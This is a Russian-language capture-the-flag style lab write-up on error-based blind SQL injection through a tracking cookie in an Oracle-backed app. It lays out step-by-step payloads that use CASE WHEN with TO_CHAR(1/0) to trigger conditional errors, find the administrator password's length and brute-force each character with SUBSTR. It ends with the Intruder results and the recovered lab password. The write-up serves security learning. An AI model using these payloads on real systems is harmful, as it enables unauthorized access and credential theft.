
Лабораторная работа содержит уязвимость, связанную со слепым внедрением SQL. Приложение использует файл cookie отслеживания для аналитики и выполняет запрос SQL, содержащий значение отправленного файла cookie.

## Дано

Результаты запроса SQL не возвращаются, и приложение не реагирует по-разному в зависимости от того, возвращает ли запрос какие-либо строки. Если запрос SQL вызывает ошибку, приложение возвращает специальное сообщение об ошибке.

База данных содержит таблицу с именем `users`, и столбцы `username` и `password`. 

## Задача 

- Зайти под учёткой `administrator`

## Разведка

- При вводе неверных данных ловим "Invalid username or password"
- При тестирование слепой инъекции при помощи символа ' 
	Ответ 500 
	При '' ответ 200

- Тестирую при помощи  объединения и || 
	`' || (SELECT NULL) || '` - ответ 500
	`' || (SELECT NULL FROM dual) || '` - ответ 200 
	`' || (SELECT NULL, NULL FROM dual) || '` - ответ 500

-  Используется бд Oracle и мы внедряем в контекст по середине 

- Тестируем `' || (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END FROM dual) || '` - где то я лоханулся
- `TO_CHAR` - нужен в ORACLE при арифметики как тип данных

- Повторное тестирование 
	`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||'` - ответ 200


# Атака

В форме запроса 
```
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||' 
```

Мы добавляем указание на таблицу users 
```
'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1) ||'
```
- ROWNUM = 1 - нужен  для ограничения количества строк, возвращаемых запросом то есть 1 

Добавляем указание что username это administrator
```
'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') ||'
```

Добавляем нагрузку по кол символов в пароле 
```
'|| (SELECT CASE WHEN (LENGTH(password)>1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') ||'
```
**ПАРОЛЬ 20 СИМВОЛОВ**

Добавляем теперь вместо кол кода `SUBSTR(password,chuslo,1)='a'` chuslo-переменная для брута и `a` это символы перебора. Вариант атаки Cluster Bomb
```
'|| (SELECT CASE WHEN (SUBSTR(password,chuslo,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') ||'
```
500 ответ символ подобран

**ПАРОЛЬ** gt62yd5bf0xtjq1ob69h

|   |   |   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|---|---|
|121|1|g|500|138|false|false|2451||
|382|2|t|500|159|false|false|2451||
|643|3|6|500|183|false|false|2451||
|564|4|2|500|179|false|false|2451||
|485|5|y|500|186|false|false|2451||
|66|6|d|500|124|false|false|2451||
|627|7|5|500|161|false|false|2451||
|28|8|b|500|193|false|false|2451||
|109|9|f|500|193|false|false|2451||
|530|10|0|500|146|false|false|2451||
|471|11|x|500|175|false|false|2451||
|392|12|t|500|152|false|false|2451||
|193|13|j|500|166|false|false|2451||
|334|14|q|500|163|false|false|2451||
|555|15|1|500|141|false|false|2451||
|296|16|o|500|174|false|false|2451||
|37|17|b|500|153|false|false|2451||
|658|18|6|500|129|false|false|2451||
|719|19|9|500|173|false|false|2451||
|160|20|h|500|184|false|false|2451||

